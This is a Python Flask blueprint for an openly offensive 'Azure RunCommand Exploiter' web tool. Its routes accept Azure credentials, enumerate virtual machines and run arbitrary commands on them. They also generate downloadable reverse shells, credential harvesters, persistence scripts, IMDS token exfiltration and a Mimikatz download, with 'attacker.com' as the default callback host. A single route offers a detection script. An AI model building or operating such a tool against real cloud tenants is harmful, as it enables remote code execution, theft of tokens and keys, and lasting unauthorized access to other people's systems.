"""
Azure RunCommand Exploiter Routes
=================================
Flask blueprint for Azure VM Agent RunCommand exploitation.
"""

from flask import Blueprint, render_template, request, jsonify, send_file
import io
import json
import sys
import os

# Add tools to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from azure_runcommand import (
        get_exploiter,
        AzureRunCommandExploiter,
        AzureCredentials,
        AzureRegion,
        VMOSType,
        CommandStatus
    )
except ImportError:
    get_exploiter = None
    AzureRunCommandExploiter = None
    AzureCredentials = None
    from enum import Enum
    class AzureRegion(Enum):
        EAST_US = "eastus"
        WEST_US = "westus"
        WEST_EUROPE = "westeurope"
        NORTH_EUROPE = "northeurope"
    class VMOSType(Enum):
        WINDOWS = "windows"
        LINUX = "linux"
    class CommandStatus(Enum):
        PENDING = "pending"
        RUNNING = "running"
        COMPLETED = "completed"
        FAILED = "failed"

azure_runcommand_bp = Blueprint('azure_runcommand', __name__, url_prefix='/azure-runcommand')


@azure_runcommand_bp.route('/')
def index():
    """Azure RunCommand Exploiter main page"""
    return render_template('azure_runcommand.html')


@azure_runcommand_bp.route('/api/regions', methods=['GET'])
def get_regions():
    """Get available Azure regions"""
    regions = [
        {"value": r.value, "label": r.value.replace("_", " ").title()}
        for r in AzureRegion
    ]
    return jsonify({"regions": regions})


@azure_runcommand_bp.route('/api/set-credentials', methods=['POST'])
def set_credentials():
    """Set Azure credentials"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    try:
        data = request.get_json()
        
        tenant_id = data.get('tenant_id', '')
        client_id = data.get('client_id', '')
        client_secret = data.get('client_secret', '')
        subscription_id = data.get('subscription_id', '')
        
        if not all([tenant_id, client_id, client_secret, subscription_id]):
            return jsonify({"error": "All credential fields are required"}), 400
        
        exploiter = get_exploiter()
        exploiter.set_credentials(
            tenant_id=tenant_id,
            client_id=client_id,
            client_secret=client_secret,
            subscription_id=subscription_id
        )
        
        return jsonify({
            "success": True,
            "message": "Credentials set successfully",
            "credentials": exploiter.credentials.to_dict()
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@azure_runcommand_bp.route('/api/enumerate-vms', methods=['POST'])
def enumerate_vms():
    """Enumerate VMs in subscription"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    try:
        data = request.get_json() or {}
        resource_group = data.get('resource_group')
        
        exploiter = get_exploiter()
        
        if not exploiter.credentials:
            return jsonify({"error": "Credentials not set"}), 400
        
        vms = exploiter.enumerate_vms(resource_group=resource_group)
        
        return jsonify({
            "success": True,
            "total_vms": len(vms),
            "vms": [vm.to_dict() for vm in vms]
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@azure_runcommand_bp.route('/api/run-command', methods=['POST'])
def run_command():
    """Execute RunCommand on VM"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    try:
        data = request.get_json()
        
        vm_name = data.get('vm_name', '')
        resource_group = data.get('resource_group', '')
        command = data.get('command', '')
        command_id = data.get('command_id')
        
        if not all([vm_name, resource_group, command]):
            return jsonify({"error": "VM name, resource group and command are required"}), 400
        
        exploiter = get_exploiter()
        
        if not exploiter.credentials:
            return jsonify({"error": "Credentials not set"}), 400
        
        # Find VM
        vm = None
        for v in exploiter.vms:
            if v.name == vm_name and v.resource_group == resource_group:
                vm = v
                break
        
        if not vm:
            # Create a temporary VM object
            from azure_runcommand import AzureVM
            vm = AzureVM(
                vm_id=f"/subscriptions/{exploiter.credentials.subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Compute/virtualMachines/{vm_name}",
                name=vm_name,
                resource_group=resource_group,
                location=AzureRegion.EAST_US,
                os_type=VMOSType.WINDOWS if data.get('os_type', 'windows').lower() == 'windows' else VMOSType.LINUX,
                vm_size="Unknown"
            )
        
        execution = exploiter.run_command(vm, command, command_id)
        
        return jsonify({
            "success": True,
            "execution": execution.to_dict()
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@azure_runcommand_bp.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    """Generate attack payload"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    try:
        data = request.get_json()
        
        payload_type = data.get('payload_type', 'reverse_shell')
        os_type = data.get('os_type', 'windows')
        callback_host = data.get('callback_host', '')
        callback_port = data.get('callback_port', 4444)
        
        exploiter = get_exploiter()
        
        if payload_type == 'reverse_shell':
            if os_type.lower() == 'windows':
                payload = exploiter.generate_windows_reverse_shell(callback_host, int(callback_port))
            else:
                payload = exploiter.generate_linux_reverse_shell(callback_host, int(callback_port))
        
        elif payload_type == 'credential_harvester':
            if os_type.lower() == 'windows':
                payload = exploiter.generate_credential_harvester_windows()
            else:
                payload = exploiter.generate_credential_harvester_linux()
        
        elif payload_type == 'persistence':
            if os_type.lower() == 'windows':
                payload = exploiter.generate_persistence_windows(callback_host, int(callback_port))
            else:
                payload = exploiter.generate_persistence_linux(callback_host, int(callback_port))
        
        elif payload_type == 'imds_exfil':
            payload = exploiter.generate_imds_exfil()
        
        elif payload_type == 'mimikatz':
            payload = exploiter.generate_mimikatz_download()
        
        else:
            return jsonify({"error": "Invalid payload type"}), 400
        
        return jsonify({
            "success": True,
            "payload_type": payload_type,
            "os_type": os_type,
            "payload": payload
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@azure_runcommand_bp.route('/api/download-payload', methods=['POST'])
def download_payload():
    """Download payload as file"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    try:
        data = request.get_json()
        
        payload_type = data.get('payload_type', 'reverse_shell')
        os_type = data.get('os_type', 'windows')
        callback_host = data.get('callback_host', 'attacker.com')
        callback_port = data.get('callback_port', 4444)
        
        exploiter = get_exploiter()
        
        if payload_type == 'reverse_shell':
            if os_type.lower() == 'windows':
                payload = exploiter.generate_windows_reverse_shell(callback_host, int(callback_port))
                ext = 'ps1'
            else:
                payload = exploiter.generate_linux_reverse_shell(callback_host, int(callback_port))
                ext = 'sh'
        
        elif payload_type == 'credential_harvester':
            if os_type.lower() == 'windows':
                payload = exploiter.generate_credential_harvester_windows()
                ext = 'ps1'
            else:
                payload = exploiter.generate_credential_harvester_linux()
                ext = 'sh'
        
        elif payload_type == 'persistence':
            if os_type.lower() == 'windows':
                payload = exploiter.generate_persistence_windows(callback_host, int(callback_port))
                ext = 'ps1'
            else:
                payload = exploiter.generate_persistence_linux(callback_host, int(callback_port))
                ext = 'sh'
        
        elif payload_type == 'imds_exfil':
            payload = exploiter.generate_imds_exfil()
            ext = 'ps1'
        
        elif payload_type == 'mimikatz':
            payload = exploiter.generate_mimikatz_download()
            ext = 'ps1'
        
        else:
            return jsonify({"error": "Invalid payload type"}), 400
        
        filename = f"{payload_type}_{os_type}.{ext}"
        
        return send_file(
            io.BytesIO(payload.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name=filename
        )
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@azure_runcommand_bp.route('/api/generate-cli', methods=['POST'])
def generate_cli_commands():
    """Generate Azure CLI commands"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    try:
        data = request.get_json()
        
        vm_name = data.get('vm_name', 'target-vm')
        resource_group = data.get('resource_group', 'target-rg')
        command = data.get('command', 'whoami')
        os_type = data.get('os_type', 'windows')
        
        exploiter = get_exploiter()
        
        if not exploiter.credentials:
            # Use placeholder credentials
            exploiter.set_credentials(
                tenant_id="<TENANT_ID>",
                client_id="<CLIENT_ID>",
                client_secret="<CLIENT_SECRET>",
                subscription_id="<SUBSCRIPTION_ID>"
            )
        
        from azure_runcommand import AzureVM
        vm = AzureVM(
            vm_id="",
            name=vm_name,
            resource_group=resource_group,
            location=AzureRegion.EAST_US,
            os_type=VMOSType.WINDOWS if os_type.lower() == 'windows' else VMOSType.LINUX,
            vm_size="Unknown"
        )
        
        cli_commands = exploiter.generate_az_cli_commands(vm, command)
        ps_commands = exploiter.generate_powershell_commands(vm, command)
        
        return jsonify({
            "success": True,
            "az_cli": cli_commands,
            "powershell": ps_commands
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@azure_runcommand_bp.route('/api/detection-script', methods=['GET'])
def get_detection_script():
    """Get detection script"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    exploiter = get_exploiter()
    script = exploiter.generate_detection_script()
    
    return send_file(
        io.BytesIO(script.encode()),
        mimetype='text/plain',
        as_attachment=True,
        download_name="detect_runcommand_abuse.ps1"
    )


@azure_runcommand_bp.route('/api/executions', methods=['GET'])
def list_executions():
    """List all command executions"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    exploiter = get_exploiter()
    
    return jsonify({
        "executions": [e.to_dict() for e in exploiter.executions]
    })


@azure_runcommand_bp.route('/api/summary', methods=['GET'])
def get_summary():
    """Get engine summary"""
    if not get_exploiter:
        return jsonify({"error": "Exploiter not available"}), 500
    
    exploiter = get_exploiter()
    return jsonify(exploiter.get_summary())


@azure_runcommand_bp.route('/api/payload-types', methods=['GET'])
def get_payload_types():
    """Get available payload types"""
    return jsonify({
        "payload_types": [
            {"value": "reverse_shell", "label": "Reverse Shell", "description": "PowerShell/Bash reverse shell"},
            {"value": "credential_harvester", "label": "Credential Harvester", "description": "Harvest Azure CLI, SSH keys, env vars"},
            {"value": "persistence", "label": "Persistence", "description": "Scheduled task/cron persistence"},
            {"value": "imds_exfil", "label": "IMDS Exfil", "description": "Exfiltrate Azure IMDS metadata and tokens"},
            {"value": "mimikatz", "label": "Mimikatz", "description": "Download and run Mimikatz (Windows only)"}
        ]
    })
